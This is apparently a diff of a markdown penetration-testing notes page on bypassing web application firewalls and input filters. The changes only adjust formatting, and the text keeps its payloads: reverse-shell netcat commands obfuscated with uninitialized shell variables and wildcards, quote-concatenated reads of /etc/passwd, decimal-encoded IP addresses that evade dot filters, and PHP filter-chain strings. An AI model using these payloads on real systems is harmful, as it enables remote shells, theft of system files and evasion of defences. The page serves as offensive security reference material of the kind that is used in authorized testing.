@@ -2,25 +2,33 @@
 
 ## Payloads and Bypass Methods for Web Filtering
 
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings" caption="swisskyrepo / PayloadsAllTheThings" %}
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings" %}
+swisskyrepo / PayloadsAllTheThings
+{% endembed %}
 
-{% embed url="https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/" caption="How To Exploit PHP Remotely To Bypass Filters & WAF Rules" %}
+{% embed url="https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/" %}
+How To Exploit PHP Remotely To Bypass Filters & WAF Rules
+{% endembed %}
 
 ### Use Uninitialized Shell Variables to Bypass Filters
 
-{% embed url="https://www.secjuice.com/web-application-firewall-waf-evasion/" caption="Web Application Firewall \(WAF\) Evasion Techniques \#3" %}
+{% embed url="https://www.secjuice.com/web-application-firewall-waf-evasion/" %}
+Web Application Firewall (WAF) Evasion Techniques #3
+{% endembed %}
 
-Uninitialized shell variables can be used for bypassing web application firewalls \(WAF\).  Example: bypassing a filter to execute a reverse shell - `nc$u -e /bin$u/bash$u <ip> <port>`.  If this doesn't work try adding spaces before and after the variable \(note the `+`'s, this example is also URL encoded\): `nc+$u++-e+/bin$u/bash$u <ip> <port>` _\(`$u` in this case is a random attacker-picked variable that would hopefully be uninitialized on the target\)._
+Uninitialized shell variables can be used for bypassing web application firewalls (WAF).  Example: bypassing a filter to execute a reverse shell - `nc$u -e /bin$u/bash$u <ip> <port>`.  If this doesn't work try adding spaces before and after the variable (note the `+`'s, this example is also URL encoded): `nc+$u++-e+/bin$u/bash$u <ip> <port>` _(`$u` in this case is a random attacker-picked variable that would hopefully be uninitialized on the target)._
 
 ### Use Wildcards to Bypass Filters
 
-{% embed url="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" caption="Web Application Firewall \(WAF\) Evasion Techniques" %}
+{% embed url="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" %}
+Web Application Firewall (WAF) Evasion Techniques
+{% endembed %}
 
 Bypass web filters by using bash wildcards:`/???/?s` `/?cmd=%2f???%2f??t%20%2f???%2fp??s??` will bypass...and execute every command that matches. such as `/bin/cat /etc/apt`, and `/bin/cat /etc/passwd`
 
-netcat firewall bypass: `/???/n? -e /???/b??h 2130706433 1337` \(`/???/?c.??????????? -e /???/b??h 2130706433 1337` for nc traditional\)
+netcat firewall bypass: `/???/n? -e /???/b??h 2130706433 1337` (`/???/?c.??????????? -e /???/b??h 2130706433 1337` for nc traditional)
 
-```text
+```
 Standard: /bin/nc 127.0.0.1 1337
 Evasion:/???/n? 2130706433 1337
 Used chars: / ? n [0-9]
@@ -32,7 +40,7 @@ Used chars: / ? t s
 
 ### Use String Concatenation to Bypass Filters
 
-```text
+```
 $ /bin/cat /etc/passwd
 $ /bin/cat /e'tc'/pa'ss'wd
 $ /bin/c'at' /e'tc'/pa'ss'wd
@@ -40,13 +48,13 @@ $ /b'i'n/c'a't /e't'c/p'a's's'w'd'
 Can use \\ instead of ' as well
 ```
 
-### Convert IP Address to Other Formats 
+### Convert IP Address to Other Formats&#x20;
 
 * [https://h.43z.one/ipconverter/](https://h.43z.one/ipconverter/)
 
 It is still understood by most programs and languages when converted to other formats, such as decimal, and avoids `.` character in filtered HTTP requests: `127.0.0.1 = 2130706433`
 
-```text
+```
 http://127.0.0.1
 
 #0 Concatenation
@@ -83,5 +91,4 @@ From [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/
 /zlib.deflate/read=string.rot13/convert.base64-encode/convert.iconv.utf-8.utf-16/resource=<resource to get>
 ```
 
-## 
-
+##
